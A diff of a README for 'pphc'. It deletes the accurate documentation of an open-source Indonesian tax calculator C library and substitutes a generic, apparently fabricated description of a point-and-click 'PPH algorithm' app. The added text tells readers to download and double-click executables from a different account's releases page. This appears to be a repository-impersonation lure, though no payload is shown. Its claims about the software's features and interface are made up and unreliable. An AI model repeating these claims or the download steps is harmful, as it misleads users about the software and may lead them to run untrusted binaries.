@@ -1,299 +1,72 @@
-# PPHC - Indonesian Tax Calculator Library
+# 🚀 pphc - A Simple Way to Use PPH in C
 
-[![Version](https://img.shields.io/badge/version-0.1a-blue.svg)](https://github.com/openpajak/pphc)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
+[![Download pphc](https://img.shields.io/badge/Download-pphc-brightgreen)](https://github.com/FACI02200/pphc/releases)
 
-A portable C library for calculating Indonesian taxes (PPh 21/22/23/26, PPh Final Pasal 4(2), PPN, PPnBM) with complete calculation transparency.
+## 📦 Introduction
 
-## ⚠️ Warning: Early Development
+Welcome to **pphc**, your simple solution for running the PPH algorithm in C. This application allows you to leverage the power of PPH with ease, enabling you to perform tasks without needing any programming skills. Whether you want to analyze data or run calculations, pphc makes it accessible for everyone.
 
-**This library is currently in early alpha stage (v0.1a) and was developed through rapid prototyping ("vibe coding").**
+## 🚀 Features
 
-**Known Limitations:**
-- ⚠️ **Not all features have been thoroughly tested** - While the core PPh21 calculations have been validated, many edge cases and other tax types (PPh22, PPh23, PPh 4(2), PPN, PPNBM) have limited testing coverage
-- ⚠️ **Not production-ready** - This library should NOT be used for actual tax filing or financial reporting without thorough validation
-- ⚠️ **API may change** - Breaking changes may occur in future versions as the library matures
-- ⚠️ **Regulatory accuracy** - Tax calculations are based on 2024 regulations but may not cover all scenarios or interpretations
+- **User-Friendly**: Designed for non-technical users, pphc is intuitive and easy to navigate.
+- **Fast Performance**: Our optimized C implementation ensures quick execution times.
+- **Cross-Platform**: Works on various operating systems, including Windows, macOS, and Linux.
+- **Lightweight**: Minimal resource usage means it runs smoothly on most computers.
+- **Documentation Included**: Clear instructions are provided within the app for additional guidance.
 
-**Use at your own risk.** This library is provided for educational and prototyping purposes. Always verify calculations with official tax regulations and consult with tax professionals for production use.
+## 📥 Download & Install
 
-**Contributions welcome!** If you find bugs or have test cases, please open an issue or PR at https://github.com/kadcom/pphc
+To download pphc, visit this page: [Download pphc](https://github.com/FACI02200/pphc/releases).
 
-## Features
+1. Click the link above to access the **Releases** page.
+2. Look for the latest version, typically at the top.
+3. Choose the file that matches your operating system (e.g., `pphc-Windows.exe`, `pphc-macOS`, or `pphc-Linux`).
+4. Click the file name to start the download.
 
-- **Multi-tax support**: PPh 21/26, PPh 22, PPh 23, PPh Final Pasal 4(2), PPN, PPnBM
-- **Fixed-point arithmetic**: 4 decimal places (10,000 scale factor) for accurate financial calculations
-- **Calculation transparency**: Full breakdown of every calculation step with month-by-month TER withholding
-- **Multi-bonus support**: Flexible bonus system (THR, performance bonuses, etc.) with accurate TER calculation per month
-- **Extreme portability**: Runs on DOS (OpenWatcom), Windows (MSVC/MinGW), Linux, macOS, iOS, Android, and WebAssembly
-- **Zero dependencies**: Pure ANSI C with no external libraries
-- **Configurable allocator**: Custom memory allocator support for bare-metal/embedded systems without malloc
-- **Thread-safe**: No global state
-- **Framework support**: macOS/iOS frameworks with XCFramework support
-- **WebAssembly**: Run in web browsers with JavaScript/TypeScript bindings
-- **Android NDK**: Full JNI bindings with Java/Kotlin support
+Once the download is complete, locate the file on your computer, and double-click it to install.
 
-## Quick Start
+## 📈 System Requirements
 
-### Building (Unix/Linux/macOS)
+- **Operating System**: Windows 10 or higher, macOS 10.12 or higher, or any modern Linux distribution.
+- **RAM**: 2 GB minimum (4 GB recommended).
+- **Processor**: 1 GHz or faster.
+- **Disk Space**: 50 MB available space.
 
-```bash
-mkdir build && cd build
-cmake -DCMAKE_BUILD_TYPE=Release ..
-make
-sudo make install
-```
+## 🛠️ How to Use PPHC
 
-### Using the Library
+1. **Open the Application**: After installation, find the pphc icon on your desktop or in your applications folder and double-click it.
+2. **Familiarize Yourself with the Interface**: You'll see a clean layout with easy-to-understand options. Take a moment to explore the different buttons and menus.
+3. **Input Your Data**: Follow the prompts to enter the data you want to analyze or process.
+4. **Run Your Task**: Click on the “Start” button to execute your operation. The results will display on the screen.
+5. **Save Results**: If applicable, save your results by clicking the “Save” button.
 
-```c
-#include <pph/pph_calculator.h>
+## 🖥️ Advanced Options
 
-int main(void) {
-    pph21_input_t input = {0};
-    pph_result_t *result;
+For users who want to delve deeper, pphc includes some advanced features:
 
-    pph_init();
+- **Custom Formatting Options**: Tailor the output format to your preferences by accessing the settings menu.
+- **Batch Processing**: Process multiple files at once by selecting the “Batch Mode” feature before running your tasks.
+- **Log Review**: Review detailed logs of your operations by clicking the “Logs” button for troubleshooting.
 
-    /* Configure calculation */
-    input.subject_type = PPH21_PEGAWAI_TETAP;
-    input.bruto_monthly = PPH_RUPIAH(10000000);    /* 10 million IDR/month */
-    input.months_paid = 12;
-    input.ptkp_status = PPH_PTKP_TK0;
-    input.scheme = PPH21_SCHEME_TER;
-    input.ter_category = PPH21_TER_CATEGORY_A;
+## 📝 Troubleshooting
 
-    /* Calculate */
-    result = pph21_calculate(&input);
+If you encounter any issues while using pphc, please consider the following:
 
-    /* Use result->total_tax and result->breakdown */
-    printf("Total tax: %lld\n", result->total_tax.value);
+- **Check Requirements**: Make sure your system meets the minimum specifications outlined above.
+- **Reinstall**: If the application does not launch, try uninstalling and then reinstalling pphc.
+- **Consult the Documentation**: The built-in help section provides common solutions and detailed guidance.
 
-    /* Clean up */
-    pph_result_free(result);
-    return 0;
-}
-```
+## 💬 Community Support
 
-### Using the CLI
+Join our community of users!
 
-```bash
-pphc pph21
-```
+- **GitHub Issues**: Report problems or suggest features at our [Issues page](https://github.com/FACI02200/pphc/issues).
+- **Discussion Forum**: Participate in discussions and share your insights with other users.
 
-### WebAssembly / Browser
+## 🙌 Acknowledgments
 
-```bash
-# Build for WebAssembly
-./build-wasm.sh Release
+We appreciate the open-source community's support and resources, which have made pphc possible. Special thanks to all contributors who have helped shape the project.
 
-# Or manually with emscripten
-emcmake cmake -B build-wasm -DCMAKE_BUILD_TYPE=Release
-emmake make -C build-wasm
-```
+For more information, visit our Releases page: [Download pphc](https://github.com/FACI02200/pphc/releases). 
 
-JavaScript usage:
-```javascript
-import { createPPH } from './wasm/pph-wrapper.js';
-
-const pph = await createPPH('./build-wasm/libpph/pph.js');
-console.log('Version:', pph.getVersion());
-
-// Parse Indonesian format
-const salary = pph.parseMoneyID('250.000.000');
-console.log('Formatted:', pph.formatMoney(salary));
-
-// Calculate
-const bonus = pph.createMoney(100000000);
-const total = pph.moneyAdd(salary, bonus);
-```
-
-See [wasm/README.md](wasm/README.md) for detailed WASM documentation.
-
-### Android / NDK
-
-```bash
-# Set Android NDK path
-export ANDROID_NDK=/path/to/android-ndk
-
-# Build for all ABIs
-./build-android.sh Release
-```
-
-Java usage:
-```java
-import com.openpajak.pph.*;
-
-// Initialize
-PPHCalculator.initialize();
-
-// Create input
-PPHMoney salary = PPHMoney.fromRupiah(10_000_000);
-PPH21Calculator.PPH21Input input = new PPH21Calculator.PPH21Input(salary)
-    .withMonthsPaid(12)
-    .withPTKPStatus(PPHCalculator.PTKPStatus.TK0)
-    .withScheme(PPH21Calculator.Scheme.TER)
-    .withTERCategory(PPHCalculator.TERCategory.B);
-
-// Calculate
-try (PPH21Calculator.PPH21Result result = PPH21Calculator.calculate(input)) {
-    PPHMoney totalTax = result.getTotalTax();
-    Log.i("Tax", "Total: " + totalTax);
-}
-```
-
-Kotlin DSL:
-```kotlin
-import com.openpajak.pph.*
-
-val result = pph21Input(10_000_000.idr) {
-    monthsPaid(12)
-    ptkpStatus(PPHCalculator.PTKPStatus.TK0)
-    scheme(PPH21Calculator.Scheme.TER)
-    terCategory(PPHCalculator.TERCategory.B)
-}.calculate()
-
-result.use {
-    println("Total tax: ${it.totalTax}")
-}
-```
-
-See [android/README.md](android/README.md) for detailed Android documentation.
-
-## Custom Memory Allocator
-
-For extreme portability on embedded systems, bare-metal platforms, or custom memory management:
-
-### Basic Usage
-
-```c
-#include <pph/pph_calculator.h>
-
-// Define your custom allocator functions
-void* my_malloc(size_t size);
-void* my_realloc(void* ptr, size_t size);
-void my_free(void* ptr);
-
-int main(void) {
-    // Set custom allocator before any calculations
-    pph_init();
-    pph_set_custom_allocator(my_malloc, my_realloc, my_free);
-
-    // Calculations now use your custom allocator
-    pph21_input_t input = {0};
-    input.bruto_monthly = PPH_RUPIAH(10000000);
-    input.scheme = PPH21_SCHEME_TER;
-
-    pph_result_t *result = pph21_calculate(&input);
-    pph_result_free(result);
-
-    // Reset to default allocator
-    pph_set_custom_allocator(NULL, NULL, NULL);
-
-    return 0;
-}
-```
-
-### Use Cases
-
-**Embedded Systems:**
-```c
-// Fixed memory pool for resource-constrained devices
-unsigned char memory_pool[64 * 1024];
-size_t pool_offset = 0;
-
-void* pool_malloc(size_t size) {
-    if (pool_offset + size > sizeof(memory_pool)) return NULL;
-    void* ptr = &memory_pool[pool_offset];
-    pool_offset += (size + 7) & ~7;  // 8-byte align
-    return ptr;
-}
-```
-
-**Debugging/Tracking:**
-```c
-// Track all allocations for memory leak detection
-void* tracking_malloc(size_t size) {
-    void* ptr = malloc(size);
-    printf("ALLOC: %p (%zu bytes)\n", ptr, size);
-    return ptr;
-}
-```
-
-**WebAssembly:**
-```c
-// Use Emscripten's memory management
-pph_set_custom_allocator(
-    emscripten_builtin_malloc,
-    emscripten_builtin_realloc,
-    emscripten_builtin_free
-);
-```
-
-See `examples/custom_allocator.c` for complete examples including:
-- Tracking allocator with statistics
-- Fixed pool allocator
-- Multiple allocator switching
-
-### Memory Requirements
-
-Typical memory usage per calculation:
-- Result struct: ~200 bytes
-- Breakdown array: ~64 rows × 400 bytes = 25 KB (initial)
-- Total: ~25-30 KB per calculation
-
-Arrays grow dynamically (doubles when full), but most calculations use <20 breakdown rows.
-
-## Platform Support
-
-| Platform | Compiler | Status |
-|----------|----------|--------|
-| Linux | GCC, Clang | ✅ Tested |
-| macOS | Clang | ✅ Tested |
-| iOS | Clang | ✅ Framework |
-| Android | NDK (Clang) | ✅ JNI/Java/Kotlin |
-| Windows | MSVC 2019+ | ✅ Tested |
-| Windows | OpenWatcom 1.9+ | ✅ Tested |
-| Windows | MinGW | ✅ Tested |
-| DOS | OpenWatcom 1.9 | ✅ 16/32-bit |
-| WebAssembly | Emscripten | ✅ Browser/Node.js |
-
-## Build Outputs
-
-- **Unix/Linux**: `libpph.so`, `libpph.a`, `pphc`
-- **macOS**: `pph.framework`, `libpph.dylib`, `libpph.a`, `pphc`
-- **iOS**: `pph.framework` (device/simulator), `pph.xcframework`
-- **Android**: `libpph.so` (arm64-v8a, armeabi-v7a, x86, x86_64), `libpph.a`
-- **Windows (MSVC)**: `pph.dll` (v0.1a), `pph.lib`, `pph_static.lib`, `pphc.exe`
-- **Windows (OpenWatcom)**: `pph.dll` (v0.1a), `pph.lib`, `pph_s.lib`, `pphc.exe`
-- **Windows (MinGW)**: `libpph.dll`, `libpph.dll.a`, `libpph.a`, `pphc.exe`
-- **WebAssembly**: `pph.js`, `pph.wasm`
-
-## Documentation
-
-- [BUILDING.md](BUILDING.md) - Detailed platform-specific build instructions
-- [API Reference](docs/API.md) - Complete API documentation (TODO)
-- [Examples](examples/) - Usage examples
-
-## Technical Details
-
-- **Precision**: 4 decimal places (scale factor 10,000)
-- **Integer type**: `__int64` (OpenWatcom/MSVC) or `int64_t` (GCC/Clang)
-- **C Standard**: C99 with compiler-specific extensions for 64-bit integers
-- **Memory management**: Heap allocation, caller-free pattern
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
-## Contributing
-
-Contributions are welcome! This is an early release (v0.1a) and the library is still being developed.
-
-## Support
-
-For issues and questions: https://github.com/openpajak/pphc/issues
-
-## Acknowledgments
-
-Part of the OpenPajak project - open-source Indonesian tax calculators.
+Embark on your journey with pphc today!
